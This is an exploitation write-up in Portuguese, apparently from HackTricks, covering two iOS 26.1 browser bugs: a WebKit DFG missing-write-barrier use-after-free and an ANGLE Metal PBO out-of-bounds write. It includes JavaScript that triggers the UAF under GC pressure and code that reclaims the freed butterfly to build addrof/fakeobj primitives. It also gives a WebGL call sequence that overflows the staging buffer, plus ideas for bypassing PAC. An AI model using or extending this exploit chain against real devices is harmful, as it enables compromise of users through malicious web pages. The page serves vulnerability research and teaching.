# WebKit DFG Store-Barrier UAF + ANGLE PBO OOB (iOS 26.1)

{{#include ../../banners/hacktricks-training.md}}

## Resumo
- **DFG Store Barrier bug (CVE-2025-43529)**: Em `DFGStoreBarrierInsertionPhase.cpp`, uma **Phi node marcada como escaped enquanto suas entradas Upsilon não estão** faz com que a fase **ignore a inserção de um write barrier** em stores de objetos subsequentes. Sob pressão do GC isto permite que o JSC libere objetos ainda alcançáveis → **use-after-free**.
- **Exploit target**: Forçar um objeto **Date** a materializar um butterfly (e.g., `a[0] = 1.1`) para que o butterfly seja liberado, e então **reclamado** como armazenamento de elementos de array para construir confusão boxed/unboxed → `addrof`/`fakeobj` primitives.
- **ANGLE Metal PBO bug (CVE-2025-14174)**: O backend Metal aloca o PBO staging buffer usando `UNPACK_IMAGE_HEIGHT` em vez da altura real da textura. Fornecer uma unpack height pequena e então emitir um grande `texImage2D` causa um **staging-buffer OOB write** (~240KB no PoC abaixo).
- **PAC blockers on arm64e (iOS 26.1)**: TypedArray `m_vector` e JSArray `butterfly` são PAC-signed; forjar fake objects com pointers escolhidos pelo atacante causa crash com `EXC_BAD_ACCESS`/`EXC_ARM_PAC`. Apenas reutilizar **already-signed** butterflies (boxed/unboxed reinterpretation) funciona.

## Disparando a barreira ausente do DFG → UAF
```js
function triggerUAF(flag, allocCount) {
const A = {p0: 0x41414141, p1: 1.1, p2: 2.2};
arr[arr_index] = A;                 // Tenure A in old space
const a = new Date(1111); a[0] = 1.1; // Force Date butterfly

// GC pressure
for (let j = 0; j < allocCount; ++j) forGC.push(new ArrayBuffer(0x800000));

const b = {p0: 0x42424242, p1: 1.1};
let f = b; if (flag) f = 1.1;       // Phi escapes, Upsilon not escaped
A.p1 = f;                           // Missing barrier state set up

for (let i = 0; i < 1e6; ++i) {}    // GC race window
b.p1 = a;                           // Store without barrier → frees `a`/butterfly
}
```
Pontos principais:
- Coloque **A** no old space para exercitar as barreiras geracionais.
- Crie um **Date** indexado para que o **butterfly** seja o alvo liberado.
- Spray `ArrayBuffer(0x800000)` para forçar o GC e ampliar a condição de corrida.
- A incompatibilidade de escape Phi/Upsilon impede a inserção do barrier; `b.p1 = a` é executado **without a write barrier**, então o GC recolhe `a`/butterfly.

## Reclaim do butterfly → confusão boxed/unboxed
Após o GC liberar o butterfly do Date, spray arrays para que o slab liberado seja reutilizado como elementos para dois arrays com diferentes element kinds:
```js
boxed_arr[0]   = obj;          // store as boxed pointer
const addr     = ftoi(unboxed_arr[0]); // read as float64 → addr leak
unboxed_arr[0] = itof(addr);   // write pointer bits as float
const fake     = boxed_arr[0]; // reinterpret as object → fakeobj
```
Status em **iOS 26.1 (arm64e)**:
- **Funcionando:** `addrof`, `fakeobj`, 20+ address leaks por execução, inline-slot read/write (on known inline fields).
- **Ainda não está estável:** generalized `read64`/`write64` via inline-slot backings.

## Restrições de PAC em arm64e (por que fake objects travam)
- **TypedArray `m_vector`** e **JSArray `butterfly`** são PAC-signed; forjar ponteiros gera `EXC_BAD_ACCESS` / provavelmente `EXC_ARM_PAC`.
- A confusion primitive funciona porque ela **reusa butterflies assinados legítimos**; introduzir ponteiros de atacante não assinados falha na autenticação.
- Possíveis ideias de bypass anotadas: caminhos JIT que pulam auth, gadgets que assinam ponteiros do atacante, ou pivotar através do ANGLE OOB.

## ANGLE Metal PBO subalocação → OOB write
Use uma unpack height muito pequena para encolher o staging buffer, depois faça upload de uma textura grande para que a cópia ultrapasse:
```js
gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, 16);  // alloc height
// staging = 256 * 16 * 4 = 16KB
// actual  = 256 * 256 * 4 = 256KB → ~240KB OOB

gl.texImage2D(gl.TEXTURE_2D, 0, gl.DEPTH_COMPONENT32F,
256, 256, 0, gl.DEPTH_COMPONENT, gl.FLOAT, 0);
```
Notas:
- Bug em `TextureMtl.cpp`: o staging buffer usa `UNPACK_IMAGE_HEIGHT` em vez da altura real da textura no caminho PBO.
- Na probe referenciada o gatilho PBO do WebGL2 está encaminhado, mas ainda não observado de forma confiável no iOS 26.1.

## Referências
- [WebKit-UAF-ANGLE-OOB-Analysis](https://github.com/zeroxjf/WebKit-UAF-ANGLE-OOB-Analysis)
- [jir4vv1t/CVE-2025-43529](https://github.com/jir4vv1t/CVE-2025-43529)

{{#include ../../banners/hacktricks-training.md}}
